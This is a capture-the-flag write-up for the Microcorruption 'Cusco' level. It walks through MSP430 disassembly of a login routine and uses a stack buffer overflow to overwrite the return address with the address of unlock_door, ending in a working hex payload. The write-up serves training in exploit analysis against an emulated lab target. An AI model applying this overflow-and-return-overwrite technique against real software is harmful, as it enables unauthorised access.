# MicroCTF Writeup


Author: [Samarth Arora](https://github.com/Samadeol) 

Level: Cusco

## Walkthrough

 `unlock_door` function is not accessible directly from login because r15 is always 0.
This is because the code where `unlock_door` is called is always jumed over cuz there exists a ```jz``` command.
```
4500 <login>
4500:  3150 f0ff      add    #0xfff0, sp
4504:  3f40 7c44      mov    #0x447c "Enter the password to continue.", r15
4508:  b012 a645      call    #0x45a6 <puts>
450c:  3f40 9c44      mov    #0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call    #0x45a6 <puts>
4514:  3e40 3000      mov    #0x30, r14
4518:  0f41           mov    sp, r15
451a:  b012 9645      call    #0x4596 <getsn>
451e:  0f41           mov    sp, r15
4520:  b012 5244      call    #0x4452 <test_password_valid>
4524:  0f93           tst    r15
4526:  0524           jz    #0x4532 <login+0x32>
4528:  b012 4644      call    #0x4446 <unlock_door>
452c:  3f40 d144      mov    #0x44d1 "Access granted.", r15
4530:  023c           jmp    #0x4536 <login+0x36>
4532:  3f40 e144      mov    #0x44e1 "That password is not correct.", r15
4536:  b012 a645      call    #0x45a6 <puts>
453a:  3150 1000      add    #0x10, sp
453e:  3041           ret
```
The code takes input of 48 bytes even though password can be a maximum of 16 bytes.
```4514:  3e40 3000      mov	#0x30, r14```
So i tried putting in a huge password like `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbjbfakjdflkjasdhflkjas ` and upon running i found that the disassembly was written over.
So our possible bet to overwrite the code such that the `login` function 'returns' the `unlock_door` functin.
To accomplish this we need to know where the stack pointer when the return statement is being executed.
so we break at the line `453e:  3041           ret` 
and then we observe the sp 
`sp  43fe`
then looking at the memory dump
```
43e0:   5645 0300 ca45 0000 0a00 0000 3a45 5050   VE...E......:EPP
43f0:   5050 5050 5050 5050 5050 5050 5050 4644   PPPPPPPPPPPPPPFD
4400:   0040 0044 1542 5c01 75f3 35d0 085a 3f40   .@.D.B\.u.5..Z?@
```
So we see that at the offset 0x11 we nee to enter the memory address `4446` keeping in mind 
the endianness.
So the final payload must be `505050505050505050505050505050504644` which should unlock the door.

## Password

`505050505050505050505050505050504644`

## Resources

`https://en.wikipedia.org/wiki/Endianness`